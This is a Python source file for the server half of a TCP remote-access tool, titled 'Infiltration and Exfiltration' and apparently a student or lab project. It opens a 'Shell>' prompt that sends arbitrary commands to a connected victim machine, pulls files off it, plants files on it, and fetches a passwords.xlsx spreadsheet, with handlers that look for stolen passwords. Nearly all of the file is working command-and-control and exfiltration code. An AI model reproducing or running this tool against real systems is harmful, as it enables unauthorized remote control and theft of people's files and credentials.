# TCP bidirectional Data transfer (Infiltration and Exfiltration) - Server
# Created by Amalan Pulendran
# Modified by Leighton Cole and Quinn Siebers
import socket
import os


def doGrab(conn, command, operation):
    # For grab operation, open a file in write mode, inside GrabbedFiles folder
    # File name should be of format: grabbed_sourceFilePathOfClientMachine
    # File name example: grabbed_C:/Users/John/Desktop/audit.docx
    if operation == "grab":
        current_user = os.getlogin()
        grab, sourcePathAsFileName = command.split("*")
        path = f"C:\\Users\\{current_user}\\Downloads\\"
        fileName = "captured_" + sourcePathAsFileName

    f = open(path + fileName, 'wb')
    while True:
        data = conn.recv(5000)
        if data.endswith(b"DONE"):
            f.write(data[:-4])  # Write the last received bits without the word 'DONE'
            f.close()
            print("File name: " + fileName)
            print("Written to: " + path)
            print("[+] Transfer completed")
            break
        elif b"No .xlsx files found" in data:
            print("[!] No Excel files could be found")
            break
        elif b"No passwords found" in data:
            print("[!] No passwords could be found")
            break
        elif b"File not found" in data:
            print("[!] Files could not be found")
            break
        f.write(data)



def doSend(conn, sourcePath, destinationPath, fileName):
    # For 'send' operation, open the file in read mode
    # Read the file into packets and send them through the connection object
    # After finished sending the whole file, send string 'DONE' to indicate the completion.
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send(b"DONE")
        print("[+] Transfer completed")
    else:
        conn.send(b"File not found")
        print("[!] Files could not be found")
        return


def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.56.1", 8080))  # Change the IP Address to fit your script
    s.listen(1)
    print("=" * 60)
    print("TCP Data Infiltration & Exfiltration")
    print("[+] Listening on port 8080 for TCP connection")
    conn, addr = s.accept()
    print("[+] Connection established from ", addr)

    while True:
        print("=" * 60)
        command = input("Shell>")
        if "terminate" in command:
            conn.send("terminate".encode())
            break

        # Command format: grab*<File Path>
        # Example: grab*C:\Users\John\Desktop\photo.jpeg
        elif "grab" in command:
            conn.send(command.encode())
            doGrab(conn, command, "grab")

        # Command format: send*<destination path>*<File Name>
        # Example: send*C:\Users\John\Desktop\*photo.jpeg
        # Source file in Linux. Example /root/Desktop
        elif "send" in command:
            sendCmd, destinationPath, fileName = command.split("*")
            source = input("Source path: ")
            conn.send(command.encode())
            doSend(conn, source, destinationPath, fileName)

        # Command format: searchExcel*<folder path>
        # Example: searchExcel*C:\Users\{current_user}\Desktop
        elif "searchExcel" in command:
            conn.send(command.encode())
            doGrab(conn, "grab*passwords.xlsx", "grab") # grabs excel file off of the currently logged in user's desktop

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())


def main():
    connect()


main()
